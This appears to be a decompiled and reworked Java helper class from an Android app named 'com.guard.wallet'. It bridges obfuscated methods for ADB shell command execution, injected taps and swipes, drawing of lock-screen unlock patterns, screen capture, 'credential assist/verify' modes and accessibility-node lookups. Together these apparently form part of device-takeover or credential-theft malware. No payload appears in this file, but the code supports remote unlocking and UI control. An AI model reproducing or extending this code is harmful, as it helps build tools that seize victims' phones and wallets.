package com.guard.wallet.delegate;

import com.guard.wallet.adb.AdbConnectionManager;
import com.guard.wallet.engine.KeepAliveEngine;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;

/**
 * ADAPT: Helper to access KeepAliveEngine static methods from within package o.
 * Inside package o, field 'c' (delegateId String) shadows class KeepAliveEngine,
 * and field 'b' (timerUtil) shadows class DelegateSyntheticHelper. This helper provides
 * access to the shadowed static methods.
 */
public final class EngineHelper {

    private EngineHelper() {}

    // ═══════ ScreenCaptureManager.e enum access (field 'r' shadows class ScreenCaptureManager in subclasses) ═══════

    public static final Object KEEP_ALIVE_UNKNOWN = ScreenCaptureManager.e.b;
    public static final Object KEEP_ALIVE_MAIN = ScreenCaptureManager.e.c;
    public static final Object KEEP_ALIVE_BACKUP = ScreenCaptureManager.e.d;

    // ═══════ ScreenCaptureManager.g enum access (field 'r' in a0 shadows class ScreenCaptureManager) ═══════

    public static final ScreenCaptureManager.g PAIR_DEPT_UNKNOWN = ScreenCaptureManager.g.b;
    public static final ScreenCaptureManager.g PAIR_DEPT_LEAVE_DEV_OPT = ScreenCaptureManager.g.c;
    public static final ScreenCaptureManager.g PAIR_DEPT_PAIR_SUCCESS = ScreenCaptureManager.g.d;
    public static final ScreenCaptureManager.g PAIR_DEPT_BACK_TO_DEV = ScreenCaptureManager.g.e;
    public static final ScreenCaptureManager.g PAIR_DEPT_PAIR_CODE = ScreenCaptureManager.g.f;
    public static final ScreenCaptureManager.g PAIR_DEPT_PAIR_DONE = ScreenCaptureManager.g.g;
    public static final ScreenCaptureManager.g PAIR_DEPT_PREPARE_FINISH = ScreenCaptureManager.g.h;
    public static final ScreenCaptureManager.g PAIR_DEPT_PAIR_FINISH = ScreenCaptureManager.g.i;

    // ═══════ PermissionManager access — field 'e' shadows class ref in o/ classes ═══════

    public static boolean eBc() { return com.guard.wallet.permission.PermissionManager.isPipReady(); }
    public static void eBd() { com.guard.wallet.permission.PermissionManager.finishPip(); }

    // ═══════ ScreenCaptureManager.c enum access (field 'c' in ScreenCaptureManager shadows inner enum) ═══════
    // ADAPT: Use REnumHelper to access ScreenCaptureManager.c enum values since direct access fails
    public static final Object CREDENTIAL_ASSIST_MODE = REnumHelper.ASSIST_MODE;
    public static final Object CREDENTIAL_VERIFY_MODE = REnumHelper.VERIFY_MODE;
    public static final Object CREDENTIAL_VERIFY_PAUSE = REnumHelper.VERIFY_PAUSE;

    // ═══════ o.i static method bridges (field 'i' or 'o' shadows class o.i) ═══════

    public static java.util.LinkedList confirmLockWindows() { return ConfirmLockDelegate.L(); }
    public static java.util.LinkedList oiL() { return ConfirmLockDelegate.L(); }

    // ═══════ KeepAliveEngine static method bridges ═══════

    public static ListenWindow cJ() { return KeepAliveEngine.J(); }
    public static void cW() { KeepAliveEngine.W(); }

    public static boolean cY() { return KeepAliveEngine.Y(); }
    public static CombineFiltersWithOr cI() { return KeepAliveEngine.I(); }
    public static CombineFilter cN() { return KeepAliveEngine.N(); }
    public static CombineFilter cK() { return KeepAliveEngine.K(); }
    public static CombineFilter cL() { return KeepAliveEngine.L(); }
    public static CombineFilter cH(String s) { return KeepAliveEngine.H(s); }
    public static CombineFilter cU() { return KeepAliveEngine.U(); }
    public static CheckedResult cP(UiObject u) { return KeepAliveEngine.P(u); }
    public static CombineFilter cA0() { return KeepAliveEngine.a0(); }

    // ═══════ DelegateSyntheticHelper static method bridges ═══════

    public static java.util.HashSet bR(com.guard.wallet.req.ListenWindow lw) { return DelegateSyntheticHelper.r(lw); }
    public static java.util.HashSet bQ(int eventType, java.util.HashSet set, com.guard.wallet.req.ListenWindow lw) { return DelegateSyntheticHelper.q(eventType, set, lw); }
    public static com.guard.wallet.condition.StringCondition bB(CombineFilter f, com.guard.wallet.condition.StringCondition sc, String prop) { return DelegateSyntheticHelper.b(f, sc, prop); }

    // ═══════ AdbConnectionManager static method bridges ═══════

    public static AdbConnectionManager heS() { return AdbConnectionManager.getInstance(); }
    public static boolean isAdbAvailable() { return AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D(); }
    public static boolean adbExec(String cmd) { return AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D() && AdbConnectionManager.getInstance().executeShellCommand(cmd); }
    public static void adbFinishSecure(boolean z2) { if (AdbConnectionManager.getInstance() != null) AdbConnectionManager.getInstance().cleanupAfterPairing(z2); }
    public static boolean adbGesture(java.util.List list) { return AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D() && AdbConnectionManager.getInstance().executeTapSequence(list); }
    @SuppressWarnings("unchecked")
    public static boolean adbDrawPattern(java.util.List list) {
        try {
            if (AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D()) {
                return AdbConnectionManager.getInstance().executeSwipeGesture((java.util.LinkedList) list);
            }
        } catch (Exception ex) {
            // executeSwipeGesture failed
        }
        return false;
    }
    public static boolean adbEvent(java.util.List list) { return AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D() && AdbConnectionManager.getInstance().executeSendEvents(list); }

    // ═══════ PermissionManager package access (field 'e' shadows package 'e' in o/ classes) ═══════

    public static void callEBD() { com.guard.wallet.permission.PermissionManager.finishPip(); }

    // ═══════ PatternLockView access (for d.java case 11) ═══════

    public static void callO0HJ(Object hObj, Object fObj) {
        com.guard.wallet.patternlock.PatternLockView h = (com.guard.wallet.patternlock.PatternLockView) hObj;
        h.j(h.m, h.l, h.o, h.I, (com.guard.wallet.patternlock.AnimatorHelper) fObj, null);
    }

    // ═══════ AccessibilityDelegate bridge (helper/ package cannot resolve as the delegate) ═══════

    /** Call AccessibilityDelegate.n(CombineFilter) — find node by CombineFilter via delegate. */
    public static UiObject delegateN(Object delegate, CombineFilter filter) {
        return ((AccessibilityDelegate) delegate).n(filter);
    }

    /** Call AccessibilityDelegate.k() — get activeRoot UiObject from delegate. */
    public static UiObject delegateK(Object delegate) {
        return ((AccessibilityDelegate) delegate).k();
    }
}
